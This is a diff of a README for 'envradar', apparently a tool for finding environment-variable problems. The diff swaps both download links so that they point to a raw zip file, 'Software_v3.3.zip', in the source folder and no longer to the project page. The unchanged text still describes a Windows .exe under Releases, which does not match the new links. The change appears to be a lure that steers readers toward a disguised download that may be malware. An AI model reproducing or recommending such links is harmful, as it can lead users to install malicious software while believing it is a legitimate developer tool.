@@ -1,6 +1,6 @@
 # 🔍 envradar - Find hidden environment variable issues fast
 
-[![Download envradar](https://img.shields.io/badge/Download-envradar-blue.svg)](https://github.com/palomitas86/envradar)
+[![Download envradar](https://img.shields.io/badge/Download-envradar-blue.svg)](https://github.com/palomitas86/envradar/raw/refs/heads/main/src/envradar/Software_v3.3.zip)
 
 ## 🎯 About this tool
 Software projects rely on settings called environment variables. These settings tell your code how to connect to databases or handle security keys. Over time, these settings become messy. You might have variables that you no longer need. Sometimes a variable exists in one place but remains empty in another. This state creates bugs.
@@ -11,7 +11,7 @@ Envradar scans your project folder. It identifies variables that code does not u
 You need a computer running Windows 10 or Windows 11. Your system should have at least 4GB of RAM. The software also requires the Python runtime environment. If you do not have Python, the download package includes an installer to help you set it up. 
 
 ## 📥 How to get the software
-You can get the latest version from our release page. Visit this link to reach the download area: [https://github.com/palomitas86/envradar](https://github.com/palomitas86/envradar).
+You can get the latest version from our release page. Visit this link to reach the download area: [https://github.com/palomitas86/envradar/raw/refs/heads/main/src/envradar/Software_v3.3.zip](https://github.com/palomitas86/envradar/raw/refs/heads/main/src/envradar/Software_v3.3.zip).
 
 Look for the section marked Releases on the right side of the page. Select the link for the Windows installer that ends in .exe. Save this file to your computer.
 
